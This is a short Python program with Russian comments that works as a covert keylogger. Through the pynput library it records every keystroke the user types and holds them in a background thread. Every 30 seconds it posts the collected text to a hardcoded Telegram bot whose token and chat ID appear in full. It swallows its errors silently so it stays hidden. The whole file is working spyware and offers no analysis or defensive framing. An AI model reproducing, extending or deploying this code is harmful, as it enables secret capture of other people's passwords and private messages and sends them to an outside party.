import platform
import threading
import time
from time import sleep

import requests
from datetime import datetime
try:
    from pynput import keyboard as pynput_keyboard
except ImportError:
    pass

if platform.system() != "Darwin":
    pass

CHAT_ID = "5018443124"
TELEGRAM_TOKEN = "7656633959:AAF_nev0Abbu5Sr4ETtE9vYdkf3mavCvcps"

# Функция отправки сообщения в Telegram
def snd_telg(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    try:
        response = requests.post(url, json=payload, timeout=5)
        return response.status_code == 200
    except Exception as e:
        return False

def monitor_input():
    typed_text = []
    last_clipboard = ""
    last_sent_time = time.time()

    # Функция обработки нажатий клавиш
    def on_press(key):
        try:
            # Игнорируем модификаторы и специальные клавиши
            if key in (pynput_keyboard.Key.ctrl, pynput_keyboard.Key.ctrl_l, pynput_keyboard.Key.ctrl_r,
                       pynput_keyboard.Key.alt, pynput_keyboard.Key.alt_l, pynput_keyboard.Key.alt_r,
                       pynput_keyboard.Key.shift, pynput_keyboard.Key.shift_l, pynput_keyboard.Key.shift_r,
                       pynput_keyboard.Key.tab, pynput_keyboard.Key.esc):
                return
            elif key == pynput_keyboard.Key.space:
                typed_text.append(" ")
            elif key == pynput_keyboard.Key.enter:
                typed_text.append("\n")
            elif key == pynput_keyboard.Key.backspace:
                if typed_text:
                    typed_text.pop()
            else:
                try:
                    typed_text.append(key.char)
                except AttributeError:
                    pass
        except Exception as e:
            pass

    listener = pynput_keyboard.Listener(on_press=on_press)
    listener.start()

    while True:
        try:
            current_time = time.time()
            if current_time - last_sent_time >= 30:
                timestamp = datetime.now()
                message = f"<b>Timestamp:</b> {timestamp}\n"
                if typed_text:
                    message += f"<b>Typed:</b> {''.join(typed_text)}\n"

                if typed_text:
                    success = snd_telg(message)
                    if success:
                        typed_text.clear()
                last_sent_time = current_time
        except Exception as e:
            time.sleep(1)

def start_monitoring_m():
    try:
        thread = threading.Thread(target=monitor_input, daemon=True)
        thread.start()
    except KeyboardInterrupt:
        pass
    except Exception as e:
        pass